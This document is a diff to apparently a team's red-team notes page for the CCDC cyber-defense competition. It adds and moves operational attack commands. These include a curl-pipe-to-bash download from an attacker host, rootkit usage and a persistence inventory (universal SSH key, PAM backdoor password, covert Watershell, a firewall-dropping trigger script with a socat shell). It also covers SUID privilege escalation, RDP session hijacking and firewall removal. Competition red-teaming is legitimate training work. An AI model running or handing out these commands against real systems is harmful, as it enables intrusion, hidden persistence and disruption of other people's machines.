@@ -92,15 +92,16 @@ pagetitle: Red Teaming for CCDC
     - `echo "{password}" | sshpass -p "{password}" ssh -o StrictHostKeyChecking=no "{username}@{ip}" "sudo -S id"`
       - This will work regardless of whether the password is actually required
     - `echo "{password}" | sshpass -p "{password}" ssh -o StrictHostKeyChecking=no "{username}@{ip}" "sudo -S bash -c 'curl -L {kali_IP}:{port}/p.sh | bash -s {kali_IP}:{port}'"`
-      - Can use `ssh_across_ips.py`
-        - `ssh_across_ips.py 10.100.100-120.35 {username} {password} '{command}'`
+      - Can use `authfinder`
+        - `authfinder {ips} -u {user} -p {pass} -c '{command}' --linux `
+          - If we need to sudo: `authfinder {ips} -u {user} -p {pass} -c 'echo {pass} | sudo -S bash -c "{commands}"' --linux -o`
       - `for i in {1..10}; do echo $i; done`
 - [Singularity](https://github.com/MatheuZSecurity/Singularity)
   - Holy balls what a nice rootkit
     - Supports hiding multiple names, has privesc, ICMP backdoor, hiding services
       - Root with `MAGIC=mtz bash` or simply `kill -59 $$`
       - Hide port by editing `modules/hiding_tcp.c` and adding a port to `is_hidden_port`
-      - Hide files containing `singularity`
+      - Hide files containing `singularity` (or any name within `include/hiding_directory_def.h`)
       - Hide process with `kill -59 <PID>`
       - ICMP shell:
         - Start listener on `8081`
@@ -129,6 +130,22 @@ pagetitle: Red Teaming for CCDC
       - Works with both adding users to `/etc/passwd` and cron jobs
         - Actually, having some trouble getting it working with cron jobs
       - However, ssh seems resistant. Can't seem to permit root logins with a hidden line or add an hidden authorized keys file
+- Current persistence: 
+  - Universal SSH key added
+    - `ssh root@ip -i id_ed25519`
+  - Pam backdoor (disabled for now)
+    - `ssh user@ip` with `NewPass123`
+    - `cat /opt/dhcpcnf/pam_out`
+  - Watershell
+    - `python3 watershell-cli.py -t ip -p 53 -c id`
+    - Run on all: `python3 broadcast.py -p 53 'id'`
+  - Triggerable: `/opt/dhcpcnf/trigger.sh`
+    - Drops firewall, re-adds universal SSH key, opens 58348
+    - ``socat FILE:`tty`,raw,echo=0 TCP:ip:58348``
+  - SUID binaries:
+    - `/usr/lib/openssh/ssh-keygen -p`
+    - `ip netns add foo; ip netns exec foo /bin/sh -p`
+    - `chroot / /bin/sh -p`
 
 ## Domain Persistence
 
@@ -237,7 +254,15 @@ pagetitle: Red Teaming for CCDC
 - Wall on linux:
   - `wall "dance"`
 - Set language to german: `echo "loadkeys de && localectl set-locale de_DE.UTF-8 && localectl set-keymap de" >> ~/.bashrc`
-
+- Firewall
+  - Iptables: `iptables -A INPUT -p tcp --dport 80 -j drop` 
+  - NFT: `nft add rule inet filter input tcp dport 80 drop`
+  - UFW: `ufw deny 80/tcp`
+- `who` to see who's on a system
+  - `pkill -t {result}` to then kill their session
+    - `pkill -KILL -u {user}` - kill all of a user's processes
+  - `kill -9 {pid}` to kill a specific process
+  
 **Trolling on Windows**
 - Set everything to German: `Install-Language -Language de-DE -CopyToSettings; Set-WinUserLanguageList de-DE -Force; Set-WinSystemLocale -SystemLocale de-DE; Set-WinUILanguageOverride -Language de-DE; Set-Culture de-DE; Set-WinHomeLocation -GeoId 94`
 - `misc::wp /file:{path}` to set the current PC's wallpaper
@@ -259,8 +284,12 @@ pagetitle: Red Teaming for CCDC
 - Firewall stuff
   - Simplewall hopper: `https://github.com/ECWRCCDC/swh/blob/main/Payload/source/swh.c`
   - Turn off firewall: `Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False`
-  - Reset firewall to default rules (this can break stuff): `netsh advfirewall reset`
-  - NUKE firewall (will prevent remote access): `Remove-NetFirewallRule -All` 
+    - Reset firewall to default rules (this can break stuff): `netsh advfirewall reset`
+    - NUKE firewall (will prevent remote access): `Remove-NetFirewallRule -All` 
+  - Firewall a service: `New-NetFirewallRule -DisplayName "adb.exe" -Direction Inbound -Protocol TCP -LocalPort 80 -Action Block`
+- See who's got an RDP session: `query user` or `query session`
+  - Hijack it with `tscon.exe {target_id} /dest:rdp-tcp#{our_rdp_session_number}`
+- Logoff user: `query session` and `logoff {id}` to log off a specific user
 
 ## Dealing with System Protections
 
@@ -298,25 +327,4 @@ pagetitle: Red Teaming for CCDC
 - Status with `sestatus`
 - Temp disable: `sudo setenforce 0` or `sudo setenforce permissive`
 - Permanent disable: set `SELINUX=enforcing` to `disabled` in `/etc/selinux/config` and reboot
-
-## Misc
-- Windows:
-  - Shutdown: `shutdown /s /t 0`
-  - Reboot: `shutdown /r /t 0`
-  - See who's got an RDP session: `query user` or `query session`
-    - Hijack it with `tscon.exe {target_id} /dest:rdp-tcp#{our_rdp_session_number}`
-  - Logoff user:
-    - `query session` and `logoff {id}` to log off a specific user
-  - Powershell save path: `(Get-PSReadlineOption).HistorySavePath`
-  - Get processes: `ps`
-    - Kill a process: `taskkill /pid {id_from_ps} /f`
-  - Search results of a command: `| FINDSTR /NI "{string}"`
-    - `/N` gets line number, `/I` ignores case
-- Linux:
-  - `reboot` to restart
-  - `who` to see who's on a system
-    - `pkill -t {result}` to then kill their session
-  - `pkill -KILL -u {user}` - kill all of a user's processes
-  - `kill -9 {pid}` to kill a specific process
-- Set date: `touch -d "4 May 2024"`
 
